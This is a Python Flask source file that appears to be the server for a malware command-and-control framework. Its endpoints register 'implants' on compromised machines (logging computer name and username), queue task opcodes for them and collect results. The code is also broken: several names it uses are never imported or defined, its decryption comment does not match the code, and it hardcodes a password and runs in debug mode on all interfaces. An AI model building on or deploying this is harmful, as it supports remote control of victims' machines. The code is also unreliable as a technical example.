from flask import Flask, request
import base64
from nacl.public import PrivateKey, Box
from nacl.encoding import HexEncoder
from implant_pb2 import RegisterImplant



rpc = Blueprint("rpc_crypto", __name__)

PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
# Load the server's private key from a file
def load_private_key():
    with open('server_private_key.txt', 'r') as key_file:
        private_key_hex = key_file.read().strip()
        return PrivateKey(private_key_hex, encoder=HexEncoder)

server_private_key = load_private_key()

@app.route('/register', methods=['POST'])
def handle_register():
    ip = request.remote_addr
    encrypted_message = request.data

    try:
        # Create a box with only the server's private key (since we use SealedBox for single key encryption)
        box = Box(server_private_key, server_private_key.public_key)

        # Decrypt the message
        decrypted_message = box.decrypt(encrypted_message)

        # Parse the decrypted message using protobuf
        register = RegisterImplant()
        register.ParseFromString(decrypted_message)

        print(f'[+] New Implant: from {ip}')
        print(f'[+]    * ImplantID: {register.ImplantID}')
        print(f'[+]    * ComputerName: {register.ComputerName}')
        print(f'[+]    * Public Key: {register.PublicKey}')
        print(f'[+]    * Username: {register.Username}')
        print(f'[+]    * Password: {register.Password}')

        if register.Password != PASSWORD:
            abort(404)

        r = register_implant(make_implant(register, ip))

        print("[+] Watch out sexy ;) a New Implant connected!")

        return Response("Successfully registered", status=200)
    except Exception as e:
        print(f"Error during registration: {str(e)}")
        return Response("Registration failed", status=500)


@rpc.route("/checkin", methods=["POST"])
def checkin():
    reg_data = request.get_data()
    ic = ImplantCheckin()
    ic.ParseFromString(reg_data)
    print(f'[+] Implant [{ic.ImplantID}] is checking in.')
    print(f'[+] --> TaskResponse = [{ic.Resp}]')

    update_implant_last_seen(ic.ImplantID) 
    
    # Send TaskRequest back or "" (if failed to analyze or no remaining tasks)
    if analyze_TaskResponse(ic.Resp):
        return get_next_task(ic.ImplantID)
    return ""

@rpc.route("/task/request", methods=["POST"])
def send_task():
    try:
        task_request = TaskRequest()
        task_request.ParseFromString(request.get_data())
        
        # Assuming the TaskRequest contains implant_id and other necessary details
        implant = Implant.query.get(task_request.implant_id)
        if not implant:
            return "Implant not found", 404
        
        # Create a new task entry
        new_task = make_task(
            id=None,
            task_id=task_request.task_id,
            status="created",
            implant_id=implant.id,
            task_opcode=task_request.opcode,
            task_args=task_request.args
        )
        db.session.add(new_task)
        db.session.commit()
        
        print(f"Task {new_task.task_id} sent to implant {implant.id}")
        return f"Task sent to implant {implant.id}", 200
    except Exception as e:
        print(f"Error sending task: {e}")
        return str(e), 500


@rpc.route("/task/response", methods=["POST"])
def receive_task_response():
    try:
        task_response = TaskResponse()
        task_response.ParseFromString(request.get_data())
        # Update the task status based on the response
        task = Task.query.filter_by(task_id=task_response.task_guid).first()
        if not task:
            return "Task not found", 404
        
        task.status = STATUS_TASK_COMPLETE if task_response.response else STATUS_TASK_FAILED
        db.session.commit()
        
        print(f"Received response for task {task.task_id} from implant {task.implant_id}")
        return f"Response received for task {task.task_id}", 200
    except Exception as e:
        print(f"Error receiving task response: {e}")
        return str(e), 500




if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)